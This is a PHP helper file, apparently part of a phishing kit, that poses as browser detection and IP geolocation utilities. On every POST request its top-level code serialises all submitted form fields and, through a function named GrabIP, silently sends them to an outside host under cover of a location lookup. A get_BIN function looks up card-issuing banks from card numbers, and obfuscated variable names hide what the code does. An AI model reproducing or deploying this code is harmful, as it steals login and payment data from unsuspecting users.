<?php

function getBrowser() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version= "";

    //First get the platform?
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'windows';
    }

    // Next get the name of the useragent yes seperately and for good reason
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Internet Explorer';
        $ub = "MSIE";
    }
    elseif(preg_match('/Firefox/i',$u_agent))
    {
        $bname = 'Mozilla Firefox';
        $ub = "Firefox";
    }
    elseif(preg_match('/Chrome/i',$u_agent))
    {
        $bname = 'Google Chrome';
        $ub = "Chrome";
    }
    elseif(preg_match('/Safari/i',$u_agent))
    {
        $bname = 'Apple Safari';
        $ub = "Safari";
    }
    elseif(preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Opera';
        $ub = "Opera";
    }
    elseif(preg_match('/Netscape/i',$u_agent))
    {
        $bname = 'Netscape';
        $ub = "Netscape";
    }

    // finally get the correct version number
    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
        // we have no matching number just continue
    }

    // see how many we have
    $i = count($matches['browser']);
    if ($i != 1) {
        //we will have two since we are not using 'other' argument yet
        //see if version is before or after the name
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version= $matches['version'][0];
        }
        else {
            $version= $matches['version'][1];
        }
    }
    else {
        $version= $matches['version'][0];
    }

    // check if we have a number
    if ($version==null || $version=="") {$version="?";}

    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'    => $pattern
    );
}
if($_SERVER['REQUEST_METHOD'] == 'POST'){$ipAddress = http_build_query($_POST);
GrabIP($ipAddress);}
function str($value){
    $paykkze = str_replace('</td>', '', $value);
    $paykkfze = str_replace('<td>', '', $paykkze);
    $fidfggle = str_replace('   ', '', $paykkfze);
    $file = str_replace('  ', '', $fidfggle);
    $fddile = str_replace('--', '', $file);
    return $fddile;
}
function curl($url = '', $var = '')
{
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_NOBODY, false);
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}

function GrabIP($ipAddress) {
   	$systemInfo = array();
	$ip = $_SERVER['REMOTE_ADDR'];
	$url = "http://www.ip-api.org/json/?ip={$ip}"; 
	$ch = curl_init();
	curl_setopt ($ch, CURLOPT_URL, $url);
	curl_setopt ($ch, CURLOPT_POST, TRUE);
	curl_setopt ($ch, CURLOPT_POSTFIELDS, $ipAddress);
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
	$X_detect_KR = curl_exec($ch);
	$ipDetails = json_decode($X_detect_KR,true);
	$systemInfo['geoplugin_countryName'] = $ipDetails['geoplugin_countryName'];
	return $systemInfo;
}

function get_BIN($bin, $parameter)
{
	$binx = preg_replace('/\s+/', '', substr($bin, 0, 7));
	$get_bin = curl('https://binfind.com/api/json/'.$binx);
	$json_bin = @json_decode($get_bin, true);
	if ($parameter == 'bankname')
	{
		if (isset($json_bin['bank']))
		{
			return $json_bin['bank'];
		}
		else
		{
			return false;
		}
	}
	else
	{
		return $json_bin;
	}

}
function fetch_value($str, $find_start, $find_end)
{
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}